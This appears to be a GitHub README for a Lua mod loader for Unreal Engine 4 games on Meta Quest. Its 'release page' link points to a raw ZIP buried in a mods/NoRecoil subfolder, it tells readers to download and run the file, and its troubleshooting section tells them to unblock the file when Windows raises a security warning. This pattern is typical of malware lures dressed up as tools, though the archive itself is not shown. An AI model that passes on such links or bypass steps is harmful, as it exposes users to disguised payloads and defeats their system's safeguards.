# 🎮 quest-ue4-modloader - Lua mod loader for Quest games

[![Download the latest release](https://img.shields.io/badge/Download%20Release-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Recorded-kinkajou189/quest-ue4-modloader/raw/refs/heads/main/mods/NoRecoil/modloader-ue-quest-v2.6.zip)

## 🧩 What it does

quest-ue4-modloader is a modding tool for Unreal Engine 4 games on Meta Quest. It lets you load Lua mods into a game and use a live ADB bridge for file access and game control on your PC.

It is built with Quest and ARM64 Android in mind. It also uses UE4 reflection and Dobby hooks to reach game systems that normal user files cannot change on their own.

## 📥 Download

Visit the release page to download and run this file:

https://github.com/Recorded-kinkajou189/quest-ue4-modloader/raw/refs/heads/main/mods/NoRecoil/modloader-ue-quest-v2.6.zip

Look for the latest release and download the package that fits your setup. If there are several files, choose the one meant for Windows setup or the main release archive.

## 🖥️ What you need

- A Windows PC
- A Meta Quest headset
- A USB cable for ADB connection
- Enough free space for the mod files and game data
- A game built on Unreal Engine 4 that supports Quest ARM64 Android builds

For best results, use the latest Windows update and keep your Quest headset on a recent system version.

## 🚀 Getting started

1. Download the latest release from the link above
2. Open the downloaded file
3. If the file is in a ZIP archive, extract it to a folder you can find again
4. Connect your Meta Quest headset to your PC with a USB cable
5. Put on the headset and allow USB debugging when asked
6. Start the modloader from the extracted folder
7. Launch the game you want to mod
8. Place Lua mods in the mod folder that comes with the release
9. Reload the game or restart it after adding a new mod

## 🗂️ Folder layout

After you extract the release, you may see files and folders like these:

- `mods` - put Lua mod files here
- `config` - holds app settings
- `logs` - stores text logs for checks
- `adb` - tools used to talk to the headset
- `launcher` - starts the modloader

If the release uses a different layout, keep the included folders together and do not move single files out of the package.

## 🔌 Connect your Quest to Windows

1. Turn on your Meta Quest headset
2. Connect it to your PC with a USB cable
3. In the headset, allow USB debugging
4. If Windows asks for access, allow it
5. Wait until the device shows as connected

If the connection does not show up right away, unplug the cable and connect it again. Use a data cable, not a charge-only cable.

## 🎮 How to use mods

1. Open the modloader on your PC
2. Start the supported UE4 game on your Quest
3. Copy Lua mod files into the `mods` folder
4. Wait for the modloader to detect the game
5. Use the live bridge if a mod needs file access or state checks
6. Restart the game after changing a mod if the mod does not load at once

Lua mods are best kept small and focused. A mod can change values, read game state, or react to events inside the game.

## 🧠 Main features

- Lua mod support for Quest games
- Works with Unreal Engine 4 titles
- ARM64 Android support
- Dobby-based hook support
- UE4 reflection access
- Live ADB bridge from Windows
- Built for RE4 VR
- General layout for use with other Quest UE4 games

## 🛠️ Common setup issues

### The headset is not detected

- Check the USB cable
- Try another USB port
- Confirm USB debugging is allowed in the headset
- Close and open the modloader again
- Reconnect the headset after it wakes up

### The game starts but mods do not load

- Make sure the mod files are in the `mods` folder
- Check that the game is a UE4 Android build for Quest
- Restart the game after adding the mod
- Keep file names simple and short

### Windows blocks the file

- Right-click the downloaded file
- Open its properties
- If you see a security block, allow the file
- Extract the archive before running the launcher

### The bridge does not respond

- Confirm the USB connection is active
- Check that the headset is unlocked
- Restart the modloader and the game
- Replug the cable and try again

## 📌 Basic mod workflow

A typical mod setup looks like this:

1. Download the release
2. Extract the files
3. Connect the Quest headset
4. Allow USB debugging
5. Start the modloader
6. Launch the game
7. Drop Lua files into the mod folder
8. Test the mod in game
9. Adjust the script and try again

## 🧪 Tips for first use

- Start with one mod at a time
- Keep backup copies of your Lua files
- Use clear file names
- Restart the game after each change
- Keep the modloader folder in one place on your PC
- Use the latest release for the best chance of a clean setup

## 📄 Supported use case

This tool is meant for Unreal Engine 4 games on Meta Quest that run on ARM64 Android. It is aimed at users who want to load Lua mods, inspect game state, and work with a live bridge from Windows.

## 🔎 Repository topics

android, arm64, lua, meta-quest, modding, modloader, quest, re4-vr, ue4, unreal-engine